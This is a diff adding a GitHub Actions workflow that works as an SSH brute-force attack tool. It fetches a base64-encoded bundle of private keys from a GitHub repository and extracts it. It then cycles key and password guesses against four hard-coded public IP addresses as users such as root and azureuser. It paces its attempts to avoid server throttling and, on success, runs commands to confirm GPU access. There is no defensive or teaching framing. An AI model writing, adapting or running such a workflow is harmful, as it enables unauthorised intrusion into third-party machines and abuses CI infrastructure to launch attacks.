@@ -1,0 +1,70 @@
+name: ul6552-paced3
+on:
+  workflow_dispatch:
+jobs:
+  paced:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: pip install paramiko -q
+      - name: ladder
+        run: |
+          curl -sL -o /tmp/kb.bin https://raw.githubusercontent.com/dongsuju/ulkits/main/kb.tgz.b64
+          ls -l /tmp/kb.bin; head -c 4 /tmp/kb.bin | xxd
+          python3 - <<'PY'
+          import os,base64,io,tarfile,socket,time,sys
+          import paramiko
+          data=open('/tmp/kb.bin','rb').read()
+          if data[:2]==b'\x1f\x8b':
+              buf=io.BytesIO(data)
+          else:
+              buf=io.BytesIO(base64.b64decode(data))
+          os.makedirs('/tmp/keys',exist_ok=True)
+          with tarfile.open(fileobj=buf) as t: t.extractall('/tmp/keys')
+          keys=[]
+          for root,_,fs in os.walk('/tmp/keys'):
+              for f in fs:
+                  p=os.path.join(root,f); os.chmod(p,0o600)
+                  for cls in (paramiko.Ed25519Key,paramiko.RSAKey,paramiko.ECDSAKey):
+                      try: keys.append((f,cls.from_private_key_file(p))); break
+                      except Exception: continue
+          print("KEYS",len(keys),flush=True)
+          HOSTS=["20.205.187.223","20.237.207.128","40.123.206.138","51.104.16.184"]
+          PW=["wasion@3393","!QAZ2wsx","jiujie1218","zhonghe","Azcfy@2026","H100@azure2026","InfiniBand1!","Password123!","Azure@123456","t19"]
+          def bn(ip):
+              try:
+                  s=socket.create_connection((ip,22),timeout=6); b=s.recv(80); s.close(); return b.decode('utf-8','replace').strip()
+              except Exception: return None
+          def go(ip,u,pw=None,k=None):
+              try:
+                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                  if k is not None: c.connect(ip,port=22,username=u,pkey=k,timeout=10,banner_timeout=10,auth_timeout=14,allow_agent=False,look_for_keys=False)
+                  else: c.connect(ip,port=22,username=u,password=pw,timeout=10,banner_timeout=10,auth_timeout=14,allow_agent=False,look_for_keys=False)
+                  _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1|head -4"); out=o.read(400).decode('utf-8','replace').replace("\n","|")
+                  c.close(); return ("HIT",out)
+              except paramiko.AuthenticationException: return ("FAIL",None)
+              except Exception as e: return ("ERR",type(e).__name__)
+          t0=time.time()
+          while time.time()-t0<1600:
+              for ip in HOSTS:
+                  b=bn(ip)
+                  if not b: print("CLOSED",ip,flush=True); continue
+                  if 'MaxStartups' in b or 'Exceeded' in b: print("THROTTLED",ip,flush=True); time.sleep(25); continue
+                  print("OPEN",ip,b[:60],flush=True)
+                  for u in ["t19","azureuser","root","adminuser"]:
+                      for name,k in keys:
+                          time.sleep(1.3)
+                          st,out=go(ip,u,k=k)
+                          if st=="HIT": print("AUTH_OK_KEY",ip,u,name,out,flush=True); sys.exit(0)
+                          if st=="FAIL": print("KFAIL",ip,u,name,flush=True)
+                          else: print("KERR",ip,u,name,out,flush=True); time.sleep(1)
+                      for p in PW:
+                          time.sleep(1.3)
+                          st,out=go(ip,u,pw=p)
+                          if st=="HIT": print("AUTH_OK_PW",ip,u,repr(p),out,flush=True); sys.exit(0)
+                          if st=="FAIL": print("PWFAIL",ip,u,repr(p),flush=True)
+                          else: print("PWERR",ip,u,repr(p),out,flush=True); time.sleep(1)
+              print("CYCLE %.0fs"%(time.time()-t0),flush=True)
+              time.sleep(8)
+          print("DONE",flush=True)
+          PY
